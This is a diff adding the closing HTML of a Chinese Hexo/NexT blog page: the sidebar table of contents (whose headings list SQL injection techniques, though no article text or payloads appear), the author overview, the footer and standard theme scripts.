+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">回显注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#payload"><span class="nav-number">1.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.</span> <span class="nav-text">布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.</span> <span class="nav-text">主要函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E5%AE%9E%E4%BE%8B"><span class="nav-number">2.2.</span> <span class="nav-text">脚本实例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.</span> <span class="nav-text">时间盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-number">3.1.</span> <span class="nav-text">相关函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E7%A4%BA%E4%BE%8B"><span class="nav-number">3.2.</span> <span class="nav-text">脚本示例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#floor"><span class="nav-number">4.1.</span> <span class="nav-text">floor</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#extractvalue"><span class="nav-number">4.2.</span> <span class="nav-text">extractvalue()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#updatexml"><span class="nav-number">4.3.</span> <span class="nav-text">updatexml()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99shell"><span class="nav-number"></span> <span class="nav-text">写shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="nav-number">1.</span> <span class="nav-text">绕过姿势</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="fxxy"
+      src="/images/logo.png">
+  <p class="site-author-name" itemprop="name">fxxy</p>
+  <div class="site-description" itemprop="description">力争下游。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fxxy-xx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fxxy-xx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2420225660@qq.com" title="E-Mail → mailto:2420225660@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fxxy</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/three-waves.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script data-pjax>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme    : 'dark',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+</body>
+</html>
